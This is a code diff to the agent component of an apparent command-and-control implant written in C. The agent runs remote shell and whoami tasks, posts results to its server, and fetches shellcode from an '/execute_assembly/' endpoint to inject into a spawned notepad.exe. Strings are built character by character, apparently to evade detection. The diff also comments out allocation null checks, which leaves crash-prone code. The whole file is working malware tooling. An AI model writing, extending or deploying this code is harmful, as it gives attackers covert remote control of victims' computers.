@@ -37,18 +37,22 @@
  */
 Agent* AgentAllocate(MALLOC malloc)
 {
+    /*
     if (malloc == 0) {
         DEBUG_PRINTF_ERROR("%s", "AgentAllocate: malloc is not defined\n");
         return NULL;
     }
+    */
 
     Agent* agent = malloc(sizeof(Agent));
 
+    /*
     if (agent == NULL)
     {
         DEBUG_PRINTF_ERROR("%s", "AgentAllocate: Allocation of agent failed\n");
         return NULL;
     }
+    */
 
     agent->_magic = AGENT_MAGIC;
 
@@ -422,7 +426,7 @@ VOID AgentSleep(_In_ PAPI api, _In_ Agent* agent)
  *
  * @brief Executes a function and returns the result
  *
- * @param _In_ PAPI api:
+ * @param _In_ Agent* agent:
  * @param _In_ PESG_STD_API pEsgStdApi:
  * @param _Out_opt_ DLL* pEsgStdDll: pointer to the standard esg dll that may be freed if a Task requires so
  * @param _In_ Task task: a Task struct to use to run a task
@@ -438,7 +442,7 @@ VOID AgentSleep(_In_ PAPI api, _In_ Agent* agent)
  * @note If execution fails, the return is FALSE otherwise the return is TRUE.
  * @note If execution fails, the data pointed to by `pTaskResult` will be NULL. Ensure to check this before using the result.
  */
-BOOL AgentExecuteTask(_In_ Agent* agent, _In_ PAPI api, _In_ PESG_STD_API pEsgStdApi, _Out_opt_ DLL* pEsgStdDll, _In_ Task task, _Out_ CHAR** pTaskResult, _Out_ DWORD* pdwSizeOfOutput)
+BOOL AgentExecuteTask(_In_ Agent* agent, _In_ PESG_STD_API pEsgStdApi, _Out_opt_ DLL* pEsgStdDll, _In_ Task task, _Out_ CHAR** pTaskResult, _Out_ DWORD* pdwSizeOfOutput)
 {
     *pdwSizeOfOutput = 0;
     *pTaskResult = NULL;
@@ -449,11 +453,13 @@ BOOL AgentExecuteTask(_In_ Agent* agent, _In_ PAPI api, _In_ PESG_STD_API pEsgSt
         DEBUG_PRINTF_WARNING("%s", "AgentExecuteTask: task.taskId is null, probably no task present");
         return FALSE;
     }
+    
+    // NOTE: use IoC here?
 
     CHAR* orgOutput;  // on heap
     if (my_strcmp(task.taskType, TASK_CMD) == 0)
     {
-        if (_AgentExecuteCmd(api, pEsgStdApi, task, pTaskResult, pdwSizeOfOutput) == FALSE)
+        if (_AgentExecuteCmd(agent, pEsgStdApi, task, pTaskResult, pdwSizeOfOutput) == FALSE)
         {
             DEBUG_PRINTF_ERROR("%s", "AgentExecuteTask: _AgentExecuteCmd failed\n");
             return FALSE;
@@ -462,7 +468,7 @@ BOOL AgentExecuteTask(_In_ Agent* agent, _In_ PAPI api, _In_ PESG_STD_API pEsgSt
     }
     else if (my_strcmp(task.taskType, TASK_WHOAMI) == 0)
     {
-        if (_AgentExecuteWhoami(api, pEsgStdApi, task, pTaskResult, pdwSizeOfOutput) == FALSE)
+        if (_AgentExecuteWhoami(agent, pEsgStdApi, task, pTaskResult, pdwSizeOfOutput) == FALSE)
         {
             DEBUG_PRINTF_ERROR("%s", "AgentExecuteTask: _AgentExecuteWhoami failed\n");
             return FALSE;
@@ -471,7 +477,7 @@ BOOL AgentExecuteTask(_In_ Agent* agent, _In_ PAPI api, _In_ PESG_STD_API pEsgSt
     }
     else if (my_strcmp(task.taskType, TASK_SHUTDOWN) == 0)
     {
-        if (_AgentExecuteShutdown(agent, api, pEsgStdDll, task))
+        if (_AgentExecuteShutdown(agent, pEsgStdDll, task))
         {
             DEBUG_PRINTF_ERROR("%s", "AgentExecuteTask: _AgentExecuteShutdown failed\n");
             return FALSE;
@@ -480,7 +486,7 @@ BOOL AgentExecuteTask(_In_ Agent* agent, _In_ PAPI api, _In_ PESG_STD_API pEsgSt
     }
     else if (my_strcmp(task.taskType, TASK_EXECUTE_ASSEMBLY) == 0)
     {
-        if (_AgentExecuteAssembly(agent, api, pEsgStdApi, pTaskResult, pdwSizeOfOutput))
+        if (_AgentExecuteAssembly(agent, pEsgStdApi, pTaskResult, pdwSizeOfOutput))
         {
             DEBUG_PRINTF_ERROR("%s", "AgentExecuteTask: _AgentExecuteAssembly failed\n");
             return FALSE;
@@ -502,7 +508,7 @@ BOOL AgentExecuteTask(_In_ Agent* agent, _In_ PAPI api, _In_ PESG_STD_API pEsgSt
  * with the task, and returns the result of the execution. The result is provided as a string along with its size.
  * The function is a private function that should not be used outside agent.c
  *
- * @param _In_ PAPI api: A pointer to the API strucutre
+ * @param _In_ Agent* agent: A pointer to the Agent strucutre
  * @param _In_ PESG_STD_API pEsgStdApi: A pointer to the ESG_STD_API structure with RunCmd initialized
  * @param _In_ Task task: The task to be executed, which contains the command details.
  * @param _Out_ CHAR** taskResult: A pointer to a character pointer that will receive the result of the command execution.
@@ -514,9 +520,9 @@ BOOL AgentExecuteTask(_In_ Agent* agent, _In_ PAPI api, _In_ PESG_STD_API pEsgSt
  *       before calling this function. The caller is responsible for freeing the memory allocated for
  *       taskResult after use.
  */
-BOOL _AgentExecuteCmd(_In_ PAPI api, _In_ PESG_STD_API pEsgStdApi, _In_ Task task, _Out_ CHAR** taskResult, _Out_ DWORD* pdwSizeOfOutput)
+BOOL _AgentExecuteCmd(_In_ Agent* agent, _In_ PESG_STD_API pEsgStdApi, _In_ Task task, _Out_ CHAR** taskResult, _Out_ DWORD* pdwSizeOfOutput)
 {
-    if (api == NULL || pEsgStdApi == NULL || taskResult == NULL || pdwSizeOfOutput == NULL) {
+    if (agent->api == NULL || pEsgStdApi == NULL || taskResult == NULL || pdwSizeOfOutput == NULL) {
         DEBUG_PRINTF_ERROR("%s", "_AgentExecuteCmd: Invalid parameters\n");
         return FALSE; // Invalid parameters
     }
@@ -530,9 +536,9 @@ BOOL _AgentExecuteCmd(_In_ PAPI api, _In_ PESG_STD_API pEsgStdApi, _In_ Task tas
         return FALSE;
     }
 
-    *taskResult = myTrim(api, orgOutput, '\n');
+    *taskResult = myTrim(agent->api, orgOutput, '\n');
 
-    ((FREE)api->free)(orgOutput);
+    ((FREE)agent->api->free)(orgOutput);
     orgOutput = NULL;
 
     if (*taskResult == NULL)
@@ -553,7 +559,7 @@ BOOL _AgentExecuteCmd(_In_ PAPI api, _In_ PESG_STD_API pEsgStdApi, _In_ Task tas
  * and returns the result of the execution. The result is provided as a string along with its size.
  * The function is a private function that should not be used outside of agent.c
  *
- * @param _In_ PAPI api: A pointer to the API strucutre
+ * @param _In_ Agent* agent: A pointer to the Agent strucutre
  * @param _In_ PESG_STD_API pEsgStdApi: A pointer to the ESG_STD_API structure with RunCmd initialized
  * @param _In_ Task task: The task to be executed.
  * @param _Out_ CHAR** taskResult: A pointer to a character pointer that will receive the result of the task.
@@ -565,11 +571,11 @@ BOOL _AgentExecuteCmd(_In_ PAPI api, _In_ PESG_STD_API pEsgStdApi, _In_ Task tas
  *       before calling this function. The caller is responsible for freeing the memory allocated for
  *       taskResult after use.
  */
-BOOL _AgentExecuteWhoami(_In_ PAPI api, _In_ PESG_STD_API pEsgStdApi, _In_ Task task, _Out_ CHAR** taskResult, _Out_ DWORD* pdwSizeOfOutput)
+BOOL _AgentExecuteWhoami(_In_ Agent* agent, _In_ PESG_STD_API pEsgStdApi, _In_ Task task, _Out_ CHAR** taskResult, _Out_ DWORD* pdwSizeOfOutput)
 {
     *pdwSizeOfOutput = 0;
 
-    if (api == NULL || pEsgStdApi == NULL || taskResult == NULL || pdwSizeOfOutput == NULL) {
+    if (agent->api == NULL || pEsgStdApi == NULL || taskResult == NULL || pdwSizeOfOutput == NULL) {
         DEBUG_PRINTF_ERROR("%s", "_AgentExecuteWhoami: Invalid parameters\n");
         return FALSE; // Invalid parameters
     }
@@ -583,9 +589,9 @@ BOOL _AgentExecuteWhoami(_In_ PAPI api, _In_ PESG_STD_API pEsgStdApi, _In_ Task 
         return FALSE;
     }
 
-    *taskResult = myTrim(api, orgOutput, '\n');
+    *taskResult = myTrim(agent->api, orgOutput, '\n');
 
-    ((FREE)api->free)(orgOutput);
+    ((FREE)agent->api->free)(orgOutput);
     orgOutput = NULL;
 
     if (*taskResult == NULL)
@@ -607,7 +613,6 @@ BOOL _AgentExecuteWhoami(_In_ PAPI api, _In_ PESG_STD_API pEsgStdApi, _In_ Task 
  * it cleans up allocated resources and terminates the current thread.
  *
  * @param _In_ Agent* agent: A pointer to the Agent structure
- * @param _In_ PAPI api: A pointer to the API structure
  * @param _Out_ DLL* pEsgStdDll: A pointer to a DLL structure that will be freed and set to NULL after the operation
  * @param _In_ Task task: The Task structure that contains details about the task being executed
  *
@@ -617,9 +622,9 @@ BOOL _AgentExecuteWhoami(_In_ PAPI api, _In_ PESG_STD_API pEsgStdApi, _In_ Task 
  *       However, it's still accounted for to be future proof.
  *
  */
-BOOL _AgentExecuteShutdown(_In_ Agent* agent, _In_ PAPI api, _Out_ DLL* pEsgStdDll, _In_ Task task)
+BOOL _AgentExecuteShutdown(_In_ Agent* agent, _Out_ DLL* pEsgStdDll, _In_ Task task)
 {
-    if (agent == NULL || api == NULL || pEsgStdDll == NULL) {
+    if (agent == NULL || agent->api == NULL || pEsgStdDll == NULL) {
         DEBUG_PRINTF_ERROR("%s", "_AgentExecuteShutdown: Invalid parameters\n");
         return FALSE; // Invalid parameters
     }
@@ -650,7 +655,7 @@ BOOL _AgentExecuteShutdown(_In_ Agent* agent, _In_ PAPI api, _Out_ DLL* pEsgStdD
     // base64 value of exitSuccess
     CHAR encodedExitOutput[17] = { 'R', 'X', 'h', 'p', 'd', 'F', 'N', '1', 'Y', '2', 'N', 'l', 'c', '3', 'M', '=', 0 };
     totalJsonSize = myStrlenA(jsonFormat)-6 + dwEncodedExitOutputSize-1 + myStrlenA(task.taskId) + myStrlenA(task.agentUuid);
-    json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
+    json = (CHAR*)((CALLOC)agent->api->calloc)(totalJsonSize, sizeof(CHAR));
 
     if (json == NULL)
     {
@@ -658,18 +663,18 @@ BOOL _AgentExecuteShutdown(_In_ Agent* agent, _In_ PAPI api, _Out_ DLL* pEsgStdD
         return FALSE;
     }
 
-    ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, task.taskId, task.agentUuid, encodedExitOutput);
-    PostRequest(api, agent->_remoteServer, agent->_remotePort, pathSendTaskOutput, json);
+    ((SNPRINTF)agent->api->snprintf)(json, totalJsonSize, jsonFormat, task.taskId, task.agentUuid, encodedExitOutput);
+    PostRequest(agent->api, agent->_remoteServer, agent->_remotePort, pathSendTaskOutput, json);
 
-    ((FREE)api->free)(pEsgStdDll->pBuffer);
+    ((FREE)agent->api->free)(pEsgStdDll->pBuffer);
     pEsgStdDll->pBuffer = NULL;
-    ((FREE)api->free)(json);
+    ((FREE)agent->api->free)(json);
     json = NULL;
-    ((FREE)api->free)(task.taskParams);
+    ((FREE)agent->api->free)(task.taskParams);
     task.taskParams = NULL;
 
     // TODO: Change with ExitProcess
-    ((EXITTHREAD)api->ExitThread)(0);
+    ((EXITTHREAD)agent->api->ExitThread)(0);
     return TRUE;
 }
 
@@ -687,8 +692,6 @@ BOOL _AgentExecuteShutdown(_In_ Agent* agent, _In_ PAPI api, _Out_ DLL* pEsgStdD
  *
  * @param _In_ Agent* agent: A pointer to the Agent structure that contains information about
  *                           the agent performing the assembly execution.
- * @param _In_ PAPI api: A pointer to the API structure that provides memory allocation and
- *                       other utility functions.
  * @param _In_ PESG_STD_API pEsgStdApi: A pointer to the standard API structure that contains the
  *                                      function for injecting code into a process.
  * @param _Out_ CHAR** pTaskResult: A pointer to a character pointer that will be allocated
@@ -703,9 +706,9 @@ BOOL _AgentExecuteShutdown(_In_ Agent* agent, _In_ PAPI api, _Out_ DLL* pEsgStdD
  *       It also allocates memory for the task result, which should be freed by
  *       the caller to avoid memory leaks.
  */
-BOOL _AgentExecuteAssembly(_In_ Agent* agent, _In_ PAPI api, PESG_STD_API pEsgStdApi, CHAR** pTaskResult, DWORD* pdwSizeOfOutput)
+BOOL _AgentExecuteAssembly(_In_ Agent* agent, PESG_STD_API pEsgStdApi, CHAR** pTaskResult, DWORD* pdwSizeOfOutput)
 {
-    if (agent == NULL || api == NULL || pEsgStdApi == NULL || pTaskResult == NULL || pdwSizeOfOutput == NULL) {
+    if (agent == NULL || agent->api == NULL || pEsgStdApi == NULL || pTaskResult == NULL || pdwSizeOfOutput == NULL) {
         DEBUG_PRINTF_ERROR("%s", "_AgentExecuteAssembly: Invalid parameters\n");
         return FALSE; // Invalid parameters
     }
@@ -714,7 +717,7 @@ BOOL _AgentExecuteAssembly(_In_ Agent* agent, _In_ PAPI api, PESG_STD_API pEsgSt
     CHAR lpApplicationName[] = { 'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', 0 };
     DWORD dwShellcodeSize;
     WCHAR cAssemblyEndpoint[] = { '/', 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', '/', 0 };
-    LPVOID shellcode = httpGetExecutable(api, &dwShellcodeSize, cAssemblyEndpoint, agent->_remoteServer, agent->_remotePort);
+    LPVOID shellcode = httpGetExecutable(agent->api, &dwShellcodeSize, cAssemblyEndpoint, agent->_remoteServer, agent->_remotePort);
 
     if (shellcode == NULL)
     {
@@ -728,7 +731,7 @@ BOOL _AgentExecuteAssembly(_In_ Agent* agent, _In_ PAPI api, PESG_STD_API pEsgSt
         return FALSE;
     }
 
-    *pTaskResult = ((CALLOC)api->calloc)(myStrlenA(TASK_EXECUTE_ASSEMBLY)+1, sizeof(CHAR));
+    *pTaskResult = ((CALLOC)agent->api->calloc)(myStrlenA(TASK_EXECUTE_ASSEMBLY)+1, sizeof(CHAR));
 
     if (*pTaskResult == NULL) {
         DEBUG_PRINTF_ERROR("%s", "_AgentExecuteAssembly: calloc for *pTaskResult failed\n");
@@ -740,7 +743,7 @@ BOOL _AgentExecuteAssembly(_In_ Agent* agent, _In_ PAPI api, PESG_STD_API pEsgSt
         *pTaskResult[i] = TASK_EXECUTE_ASSEMBLY[i];
     }
 
-    ((FREE)api->free)(shellcode);
+    ((FREE)agent->api->free)(shellcode);
     return TRUE;
 }
 
